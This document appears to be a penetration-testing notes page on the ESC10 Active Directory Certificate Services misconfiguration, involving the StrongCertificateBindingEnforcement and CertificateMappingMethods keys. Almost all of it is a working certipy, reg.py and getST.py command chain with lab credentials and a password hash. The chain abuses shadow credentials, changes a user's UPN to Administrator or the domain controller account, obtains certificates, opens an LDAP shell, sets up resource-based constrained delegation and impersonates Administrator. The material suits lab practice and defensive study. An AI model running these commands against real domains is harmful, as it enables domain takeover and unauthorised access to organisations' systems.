---
description: ESC | Active Directory Certificate Services
---

# ESC10

ESC10 is a misconfiguration in the `StrongCertificateBindingEnforcement` registry key, that key handles certificate mapping during Kerberos authentication.&#x20;

```bash
# Reviewing registry keys ad administrator
reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'

# Get Shadow Credentials user2
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2

# Change user2 UPN to Administrator
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn administrator@lab.local

# Get certificate with User template
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User

# Revert back to user2
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local

# Auth as administrator
certipy auth -pfx administrator.pfx -domain lab.local
```

Another case is related to a misconfiguration in the `CertificateMappingMethods`. Because the registry key handles Schannel authentication we cannot authenticate using PKINIT. On certipy we can use -ldap-shell to authenticate with Schannel

```bash
# Check registry
reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'

# Update account to match DC machine name
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local'

# Get certificate as user2 which will give DC certificate
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User

# Revert changes
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local

# Create new computer account using Schannel
certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell

# Set rights RBCD on new computer
certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell

# Abuse RBCD and get Service Ticket 
getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.205.199 lab.local/'plaintext$':plaintext123
```

{% hint style="danger" %}
With error: `[-] Kerberos SessionError: KRB_AP_ERR_BADMATCH(Ticket and authenticator don't match)` it means that is trying to use the enviroment variable `KRB5CCNAME` we can use the following command to remove the variable: `unset KRB5CCNAME`
{% endhint %}

